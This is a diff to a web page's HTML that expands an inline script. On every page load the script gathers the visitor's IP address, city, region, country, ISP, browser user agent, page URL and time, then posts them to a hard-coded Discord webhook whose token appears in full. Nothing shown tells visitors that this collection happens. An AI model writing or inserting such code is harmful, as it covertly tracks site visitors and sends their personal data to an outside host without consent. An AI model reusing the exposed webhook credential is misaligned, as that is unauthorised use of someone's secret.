@@ -314,10 +314,16 @@ function fadeMatrixEffect(duration = 1500) {
     <script>
       const webhookUrl = "https://discord.com/api/webhooks/1409359251222040587/NukZey8EYC91P-uzzr3OXyXJAcQCs-_E0FczEkBjf4M_X4wb8pUVZqScls2UupufSDfK";
 
-      fetch("https://api.ipify.org?format=json")
+      fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(data => {
-          const message = `🔑 Visitor IP: ${data.ip}`;
+          const message = `🌍 New Visitor!
+🔑 IP: ${data.ip}
+📍 Location: ${data.city}, ${data.region}, ${data.country_name}
+🏢 ISP: ${data.org}
+🖥️ Browser/OS: ${navigator.userAgent}
+📄 Page: ${window.location.href}
+🕒 Time: ${new Date().toLocaleString()}`;
 
           fetch(webhookUrl, {
             method: "POST",
@@ -325,7 +331,7 @@ function fadeMatrixEffect(duration = 1500) {
             body: JSON.stringify({ content: message })
           });
         })
-        .catch(err => console.error("Error fetching IP:", err));
+        .catch(err => console.error("Error fetching visitor info:", err));
     </script>
   </body>
 </html>
